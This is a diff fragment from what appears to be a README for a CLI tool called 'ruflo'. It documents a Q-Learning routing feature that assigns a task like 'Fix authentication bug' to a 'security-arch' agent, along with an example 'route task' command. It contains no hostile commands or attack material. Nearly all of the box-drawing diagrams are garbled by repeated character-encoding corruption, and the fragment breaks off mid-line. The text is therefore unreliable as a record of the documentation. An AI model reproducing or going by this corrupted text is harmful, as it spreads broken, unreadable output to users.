¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                     INTELLIGENT ROUTING                             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Task: "Fix authentication bug"                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Analyze Task    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ ÃƒÂ¢Ã¢â‚¬Â Ã‚Â Complexity, domain, keywords                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Q-Learning      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ ÃƒÂ¢Ã¢â‚¬Â Ã‚Â Historical success rates per agent           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Lookup          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡           ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¼                                                         ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Recommend:      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ security-arch   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ 94% confidence (auth domain expert)          ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                                                ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Route Commands
@@ -4399,23 +4399,23 @@ The Route system uses **Q-Learning** to automatically assign tasks to the best a
 npx ruflo@latest route task "refactor authentication to use JWT"
 
 # Output:
-# Ã¢â€¢â€Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢â€”
-# Ã¢â€¢â€˜                    ROUTING RECOMMENDATION                     Ã¢â€¢â€˜
-# Ã¢â€¢Â Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢